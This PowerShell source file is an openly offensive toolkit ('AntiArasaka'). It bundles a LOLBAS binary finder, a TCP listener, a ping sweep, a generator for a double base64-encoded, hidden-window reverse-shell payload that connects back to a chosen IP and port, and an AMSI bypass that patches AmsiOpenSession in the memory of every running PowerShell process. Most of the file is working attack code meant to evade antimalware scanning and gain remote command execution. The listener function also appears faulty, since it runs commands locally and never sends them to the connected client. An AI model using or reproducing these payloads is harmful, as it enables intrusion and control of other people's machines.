<#
.SYNOPSIS
  AntiArasaka T00l K1t
.DESCRIPTION
  Invoke Your Cyber Power
.NOTES
  アンチ・アラサカ         
  Author: H0ru
  Website: https://github.com/h0ru/antiarasaka
#>

#]>====================[ALIAS]====================<[#
    New-Alias -Name aaa -Value AntiArasaka-Alias
    New-Alias -Name aah -Value AntiArasaka-Help
    New-Alias -Name aab -Value AntiArasaka-Binaries
    New-Alias -Name aal -Value AntiArasaka-Listener
    New-Alias -Name aap -Value AntiArasaka-Payload
    New-Alias -Name aar -Value AntiArasaka-Reaper
    New-Alias -Name aas -Value AntiArasaka-Sweep
#]>================================================<[#

function AntiArasaka-Alias {
    Write-Host "
        Command                          Alias
        -------	                         ------
        AntiArasaka-Alias	   ->	  aaa
        AntiArasaka-Help           ->	  aah
	AntiArasaka-Binaries	   ->     aab
	AntiArasaka-Listener	   ->	  aal
        AntiArasaka-Payload	   ->	  aap
        AntiArasaka-Reaper         ->     aar        
	AntiArasaka-Sweep          ->     aas
"
}

function AntiArasaka-Help {
    Write-Host -f Red @"
	   _____           __   __   _____                               __           
	  /  _  \   ____ _/  |_|__| /  _  \ ____________    __________  |  | ______   
	 /  /_\  \ /    \\   __\  |/  /_\  \\_  __ \__  \  /  ___/__  \ |  |/ /__  \  
	/    |    \   |  \|  | |  |    |    \|  | \// __ \_\___ \ / __ \_    \ / __ \_
	\____|__  /___|  /|__| |__|____|__  /|__|  (____  /____  \____  /__|_ \____  /
	        \/     \/                 \/            \/     \/     \/     \/    \/ 
				          --=[By H0ru]=--
"@
    Write-Host -f Yellow "
	[+] Check more on: https://github.com/h0ru/antiarasaka
        [+] Use this toolkit on your CyberDeck, Use it wisely!"

    Write-Host -f Gray "
	AntiArasaka-Alias       or   aaa   //  Only Execute
	AntiArasaka-Help        or   aah   //  Only Execute
	AntiArasaka-Binaries    or   aab   //  Only Execute or -Name or -Filter
 	AntiArasaka-Listener    or   aal   //  -i <IP> -p <PORT> 
	AntiArasaka-Payload     or   aap   //  -i <IP> -p <PORT>
	AntiArasaka-Reaper      or   aar   //  Only Execute
	AntiArasaka-Sweep	or   aas   //  <IP>"

    Write-Host -f cyan "
        [About AntiArasaka-Binaries]
        [?] Based on the LOLBAS project, featuring 198 binaries.
        [?] Check more details on exploration and usage at: https://lolbas-project.github.io
    
            -Name       Use cases: aab -Name cmd.exe // aab -Name cert // aab -Name .ps1
	    -Filter     Use cases: aab -Filter .exe // aab -Filter .bat,.dll
       
        [AntiArasaka-Reaper]
        [?] From my project AMSI-Reaper.
        [?] Check more details at: https://github.com/h0ru/AMSI-Reaper

        [AntiArasaka-Sweep]
        [?] From my project icmp-quickhacks - psweepx.
        [?] Check more details at https://github.com/h0ru/icmp-quickhacks/tree/main/psweepx
"
}

function AntiArasaka-Binaries {
param (
    [string]$Name,
    [string[]]$Filter = @(".exe", ".dll", ".bat", ".ps1", ".vbs")
)

$Resources = @("AddinUtil.exe","AppInstaller.exe","Aspnet_Compiler.exe","At.exe","Atbroker.exe","Bash.exe","Bitsadmin.exe","CertOC.exe","CertReq.exe","Certutil.exe","Cmd.exe","Cmdkey.exe","cmdl32.exe","Cmstp.exe","Colorcpl.exe","ConfigSecurityPolicy.exe","Conhost.exe","Control.exe","Csc.exe","Cscript.exe","CustomShellHost.exe","DataSvcUtil.exe","Desktopimgdownldr.exe","DeviceCredentialDeployment.exe","Dfsvc.exe","Diantz.exe","Diskshadow.exe","Dnscmd.exe","Esentutl.exe","Eventvwr.exe","Expand.exe","Explorer.exe","Extexport.exe","Extrac32.exe","Findstr.exe","Finger.exe","fltMC.exe","Forfiles.exe","Fsutil.exe","Ftp.exe","Gpscript.exe","Hh.exe","IMEWDBLD.exe","Ie4uinit.exe","iediagcmd.exe","Ieexec.exe","Ilasm.exe","Infdefaultinstall.exe","Installutil.exe","Jsc.exe","Ldifde.exe","Makecab.exe","Mavinject.exe","Microsoft.Workflow.Compiler.exe","Mmc.exe","MpCmdRun.exe","Msbuild.exe","Msconfig.exe","Msdt.exe","Msedge.exe","Mshta.exe","Msiexec.exe","Netsh.exe","Odbcconf.exe","OfflineScannerShell.exe","OneDriveStandaloneUpdater.exe","Pcalua.exe","Pcwrun.exe","Pktmon.exe","Pnputil.exe","Presentationhost.exe","Print.exe","PrintBrm.exe","Provlaunch.exe","Psr.exe","Rasautou.exe","rdrleakdiag.exe","Reg.exe","Regasm.exe","Regedit.exe","Regini.exe","Register-cimprovider.exe","Regsvcs.exe","Regsvr32.exe","Replace.exe","Rpcping.exe","Rundll32.exe","Runexehelper.exe","Runonce.exe","Runscripthelper.exe","Sc.exe","Schtasks.exe","Scriptrunner.exe","Setres.exe","SettingSyncHost.exe","ssh.exe","Stordiag.exe","SyncAppvPublishingServer.exe","Tar.exe","Ttdinject.exe","Tttracer.exe","Unregmp2.exe","vbc.exe","Verclsid.exe","Wab.exe","winget.exe","Wlrmdr.exe","Wmic.exe","WorkFolders.exe","Wscript.exe","Wsreset.exe","wuauclt.exe","Xwizard.exe","msedge_proxy.exe","msedgewebview2.exe","wt.exe","code.exe","GfxDownloadWrapper.exe","Advpack.dll","Desk.cpl","Dfshim.dll","Ieadvpack.dll","Ieframe.dll","Mshtml.dll","Pcwutl.dll","Scrobj.dll","Setupapi.dll","Shdocvw.dll","Shell32.dll","Shimgvw.dll","Syssetup.dll","Url.dll","Zipfldr.dll","Comsvcs.dll","AccCheckConsole.exe","adplus.exe","AgentExecutor.exe","Appvlp.exe","Bginfo.exe","Cdb.exe","coregen.exe","Createdump.exe","csi.exe","DefaultPack.EXE","Devinit.exe","Devtoolslauncher.exe","dnx.exe","Dotnet.exe","dsdbutil.exe","Dump64.exe","DumpMinitool.exe","Dxcap.exe","Excel.exe","Fsi.exe","FsiAnyCpu.exe","Mftrace.exe","Microsoft.NodejsTools.PressAnyKey.exe","Msdeploy.exe","MsoHtmEd.exe","Mspub.exe","msxsl.exe","ntdsutil.exe","OpenConsole.exe","Powerpnt.exe","Procdump.exe","ProtocolHandler.exe","rcsi.exe","Remote.exe","Sqldumper.exe","Sqlps.exe","SQLToolsPS.exe","Squirrel.exe","te.exe","Teams.exe","TestWindowRemoteAgent.exe","Tracker.exe","Update.exe","VSDiagnostics.exe","VSIISExeLauncher.exe","VisualUiaVerifyNative.exe","Vshadow.exe","vsjitdebugger.exe","Wfc.exe","Winword.exe","Wsl.exe","devtunnel.exe","vsls-agent.exe","vstest.console.exe")

$ResourcesFiles = @(
    "C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat",
    "C:\Program Files\WindowsPowerShell\Modules\Pester\*\bin\Pester.bat",
    "C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs",
    "C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs",
    "C:\Windows\System32\SyncAppvPublishingServer.vbs",
    "C:\Windows\System32\winrm.vbs",
    "C:\Windows\SysWOW64\winrm.vbs",
    "C:\Windows\diagnostics\system\Audio\CL_LoadAssembly.ps1",
    "C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1",
    "C:\Windows\diagnostics\system\Audio\CL_Mutexverifiers.ps1",
    "C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1",
    "C:\Windows\diagnostics\system\Video\CL_Mutexverifiers.ps1",
    "C:\Windows\diagnostics\system\Speech\CL_Mutexverifiers.ps1",
    "C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1",
    "C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1",
    "C:\Windows\diagnostics\system\WindowsUpdate\CL_Invocation.ps1",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\Launch-VsDevShell.ps1",
    "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\Launch-VsDevShell.ps1",
    "C:\Windows\diagnostics\system\Networking\UtilityFunctions.ps1"
)

foreach ($Resource in $Resources) {
    $CommandInfo = Get-Command $Resource -ErrorAction SilentlyContinue
    if ($CommandInfo) {
        $sourceExtension = [System.IO.Path]::GetExtension($CommandInfo.Source)
        if (($Filter -contains $sourceExtension) -and ($CommandInfo.Name -like "*$Name*")) {
	    Write-Host -f Blue  "#>===============[Binaries]==============<#"
            Write-Host -f Green "[>] $($CommandInfo.Source)"
            Write  "#>===============[LOLBINS]===============<#"
        }
    }
}

foreach ($ResourceFile in $ResourcesFiles) {
    $FileExtension = [System.IO.Path]::GetExtension($ResourceFile)
    if ((($Filter -contains $FileExtension) -or !$Filter) -and ($ResourceFile -like "*$Name*" -or !$Name)) {
        $fileExists = Test-Path $ResourceFile
        if ($fileExists) {
            Write-Host -f Yellow  "#>===============[Scripts]===============<#"
            Write-Host -f Green "[>] $resourceFile"
            Write  "#>===============[LOLBINS]===============<#"
        }
    }
}

}


function AntiArasaka-Listener {
    [CmdletBinding()]
    param (
        [string]$i,
        [int]$p
    )

    if (-not $i -or -not $p) {
        Write-Error "Remember: -i and -p."
        return
    }

    $listener = $null

    try {
        $listener = [System.Net.Sockets.TcpListener]::new($i, $p)
        $listener.Start()

        Write-Host -f Blue ("[+] Awaiting connection on [{0}:{1}]" -f $i, $p)
        $client = $listener.AcceptTcpClient()
        $stream = $client.GetStream()
        $reader = [System.IO.StreamReader]::new($stream)
        $writer = [System.IO.StreamWriter]::new($stream)
        $writer.AutoFlush = $true

        Write-Host -f Green ("[+] Connection established with [{0}:{1}]" -f $client.Client.RemoteEndPoint.Address, $client.Client.RemoteEndPoint.Port)

        function Commander {
            $command = $null
            while ($command -eq $null) {
                $command = Read-Host "[AAK-PShell]:>"
            }
            return $command
        }

        while ($true) {
            $command = Commander

            if ($command.ToLower() -eq 'exit') {
                $writer.WriteLine($command)
                Write-Host -f Yellow "[X] Bye! See you later" 
                $client.Close()
                break
            }

            $output = try {
                Invoke-Expression $command 2>&1 | Out-String
            }
            catch {
                $null
            }

            Write-Host $output
        }
    }
    catch {
        Write-Host -f Red ("[Error]: $_")
    }
    finally {
        if ($listener -ne $null) {
            $listener.Stop()
            $listener = $null
        }
    }
}

function AntiArasaka-Payload {
    [CmdletBinding()]
    param (
    [string]$i,
    [int]$p
)
if (-not $i -or -not $p) {
    Write-Error "Remember: -i and -p."
    return
}
    $payload = "`$TCPClient = New-Object Net.Sockets.TCPClient(""$i"", $p);$NetworkStream = `$TCPClient.GetStream();`$StreamReader = New-Object IO.StreamReader(`$NetworkStream);`$StreamWriter = New-Object IO.StreamWriter(`$NetworkStream);while (`$true) {{`$command = `$StreamReader.ReadLine();if (`$command -eq ""exit"") {{break}}`$output = Invoke-Expression `$command 2>&1;if (`$output -is [System.Object[]]) {{`$output = $output -join ""``n""}}`$StreamWriter.WriteLine(`$output);`$StreamWriter.Flush()}}`$StreamReader.Close();`$StreamWriter.Close();`$TCPClient.Close()"
    $base64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)) 
    $cmdline = "Start-Process powershell -ArgumentList ""-ep bypass -e $base64Payload"" -WindowStyle Hidden"
    $base64Cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmdline))
    $shell = "powershell -ep bypass -e $base64Cmd"
    $shell | Set-Clipboard
    Write-Host -f Green ("[+] Payload copied to clipboard! Use Ctrl+V to paste and execute.")
}

function AntiArasaka-Reaper {
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class AMSIReaper
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

function ModAMSI($processId)
{
    $patch = [byte]0xEB

    $hHandle = [AMSIReaper]::OpenProcess([AMSIReaper]::PROCESS_VM_OPERATION -bor [AMSIReaper]::PROCESS_VM_READ -bor [AMSIReaper]::PROCESS_VM_WRITE, $false, $processId)
    if ($hHandle -ne [System.IntPtr]::Zero)
    {
        Write-Host "[+] Process opened with Handle ~> $hHandle"
    }

    $amsiDLL = [AMSIReaper]::LoadLibrary("amsi.dll")
    if ($amsiDLL -ne [System.IntPtr]::Zero)
    {
        Write-Host "[+] amsi.dll located at ~> $amsiDLL"
    }

    $amsiOpenSession = [AMSIReaper]::GetProcAddress($amsiDLL, "AmsiOpenSession")
    if ($amsiOpenSession -ne [System.IntPtr]::Zero)
    {
        Write-Host "[+] AmsiOpenSession located at ~> $amsiOpenSession"
    }

    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)
    Write-Host "[+] Trying to Inject ~> $patchAddr"

    $bytesWritten = 0
    $result = [AMSIReaper]::WriteProcessMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
    if ($result)
    {
        Write-Host "[!] Process Memory Injected!"
    }

    [AMSIReaper]::CloseHandle($hHandle)
}

function ModAllPShells
{
    $processes = Get-Process
    foreach ($proc in $processes)
    {
        $name = $proc.ProcessName
        if ($name -eq "powershell")
        {
            $processId = $proc.Id
            Write-Host ""
            Write-Host "# ----------------- [STATUS] ----------------- #"
            Write-Host "[!] Injection process PowerShell with PID: $processId"
            ModAMSI $processId
        }
    }
}

Write-Host "[>] Developed by H0ru, check more on https://github.com/h0ru/AMSI-Reaper"
ModAllPShells
}

function AntiArasaka-Sweep {
Add-Type @"
    using System;
    using System.Net.NetworkInformation;
    using System.Threading.Tasks;

    public class PingSweepX {
        public static void Main(string[] args) {
            if (args.Length != 1) {
                Console.WriteLine("[>] Developed by H0ru, check more on https://github.com/h0ru/icmp-quickhacks");
                return;
            }

            string IPAddress = args[0];

            Console.WriteLine("\n[>] Starting the scanning at: " + GetIpBase(IPAddress) + "...\n");

            PingSweep(GetIpBase(IPAddress), 1, 255);

            Console.WriteLine("\nFinished!");
        }

        public static string GetIpBase(string IPAddress) {
            string[] octets = IPAddress.Split('.');
            if (octets.Length == 4) {
                return string.Format("{0}.{1}.{2}", octets[0], octets[1], octets[2]);
            }
            return IPAddress;
        }

        public static void PingSweep(string IPBase, int StartRange, int endRange) {
            var tasks = new Task[endRange - StartRange + 1];

            for (int i = StartRange; i <= endRange; i++) {
                string targetIpAddress = string.Format("{0}.{1}", IPBase, i);
                tasks[i - StartRange] = PingHost(targetIpAddress);
            }

            Task.WaitAll(tasks); // Wait for all tasks to complete

            for (int i = 0; i < tasks.Length; i++) {
                string targetIpAddress = string.Format("{0}.{1}", IPBase, i + StartRange);
                PingReply reply = (tasks[i] as Task<PingReply>).Result;

                if (reply.Status == IPStatus.Success) {
                    Console.WriteLine("[+] Host " + targetIpAddress + " Online");
                }
            }
        }

        public static Task<PingReply> PingHost(string IPAddress) {
            var ping = new Ping();
            return ping.SendPingAsync(IPAddress, timeout: 1000);
        }
    }
"@
[PingSweepX]::Main($args)
}
